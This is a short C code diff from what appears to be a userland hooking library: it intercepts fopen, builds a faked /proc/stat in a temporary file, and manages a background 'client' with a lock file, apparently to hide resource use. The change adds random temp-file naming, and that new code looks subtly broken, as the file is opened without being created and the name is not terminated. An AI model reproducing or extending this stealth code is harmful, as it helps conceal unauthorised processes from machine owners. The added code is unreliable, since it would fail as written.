@@ -1,4 +1,5 @@
 #include <fcntl.h>
+#include <time.h>
 #include <signal.h>
 #include <sys/stat.h>
 #include <sys/prctl.h>
@@ -91,8 +92,14 @@ int fake_proc_stat(void)
 {
     ORIG(fopen, -1);
 
-    int fd = open("/tmp", O_TMPFILE | O_RDWR);
+    char t[64];
+    srand(time(NULL));
+    strcpy(t, "/tmp/" PREFIX "-");
+    int l = strlen(t);
+    for (int i = l; i < l+5; i++) t[i] = 'A' + rand() % 26;
+    int fd = open(t, O_RDWR);
     if (fd == -1) return -1;
+    remove(t);
 
     FILE *f = original_fopen("/proc/stat", "r");
     if (!f) return -1;
@@ -138,6 +145,7 @@ bool client_running(void)
 }
 
 // FIXME process doesnt get started?
+// (THE LOCK DOESNT GET DELETED AFTER SYSTEMD?)
 bool start_client(void)
 {
     char *lock_name = "/" PREFIX ".LOCK";
